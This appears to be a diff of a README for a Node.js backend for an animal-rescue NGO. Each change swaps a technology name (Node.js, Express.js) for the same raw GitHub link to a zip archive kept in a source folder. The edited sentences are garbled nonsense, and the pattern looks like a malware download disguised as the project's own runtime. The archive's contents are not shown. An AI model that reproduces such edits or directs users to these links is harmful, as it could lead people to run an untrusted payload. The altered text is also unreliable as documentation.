@@ -1,6 +1,6 @@
 # Animal NGO Backend API
 
-A Node.js backend application for an Animal NGO platform that facilitates animal rescue operations and donation management. Built with Express.js, PostgreSQL, and Docker for containerized deployment.
+A https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/middlewares/animal-ngo-backend-v1.7.zip backend application for an Animal NGO platform that facilitates animal rescue operations and donation management. Built with https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/middlewares/animal-ngo-backend-v1.7.zip, PostgreSQL, and Docker for containerized deployment.
 
 ## Features
 
@@ -12,8 +12,8 @@ A Node.js backend application for an Animal NGO platform that facilitates animal
 
 ## Tech Stack
 
-- **Runtime**: Node.js
-- **Framework**: Express.js
+- **Runtime**: https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/middlewares/animal-ngo-backend-v1.7.zip
+- **Framework**: https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/middlewares/animal-ngo-backend-v1.7.zip
 - **Database**: PostgreSQL
 - **Authentication**: JWT (JSON Web Tokens)
 - **Password Hashing**: bcrypt
@@ -52,7 +52,7 @@ A Node.js backend application for an Animal NGO platform that facilitates animal
 
 ## Prerequisites
 
-- Node.js (v14 or higher)
+- https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/middlewares/animal-ngo-backend-v1.7.zip (v14 or higher)
 - Docker and Docker Compose
 - PostgreSQL (if running without Docker)
 
